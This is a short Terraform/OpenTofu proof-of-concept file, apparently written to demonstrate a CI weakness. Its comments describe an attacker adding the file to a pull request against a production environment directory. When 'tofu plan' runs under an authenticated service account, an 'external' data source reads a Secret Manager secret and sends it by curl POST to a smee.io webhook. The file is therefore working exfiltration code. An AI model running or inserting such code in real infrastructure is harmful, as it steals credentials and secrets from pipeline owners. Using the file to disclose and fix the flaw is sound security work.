# PoC: Attacker adds this file to a PR targeting configs/terraform/environments/prod/.
# tofu plan is already authenticated as terraform-planner SA (via WIF).
# The SA has secretAccessor on poc-terraform-planner-secret-exfil-test (created by poc_secret.tf).
# Replace WEBHOOK_URL below with your https://webhook.site/... URL to see the exfiltrated value.

terraform {
  required_providers {
    external = {
      source  = "hashicorp/external"
      version = ">= 2.0"
    }
  }
}

data "google_secret_manager_secret_version" "poc_stolen" {
  project = var.terraform_planner_gcp_service_account.project_id
  secret  = "poc-terraform-planner-secret-exfil-test"
}

data "external" "poc_exfiltrate" {
  program = ["bash", "-c", <<-EOT
    curl -s -X POST https://smee.io/WlbqIvQbkYB6Zh9P \
      --data-urlencode "secret=${data.google_secret_manager_secret_version.poc_stolen.secret_data}"
    echo '{"status":"exfiltrated"}'
  EOT
  ]
}

output "poc_exfil_status" {
  value     = data.external.poc_exfiltrate.result
}
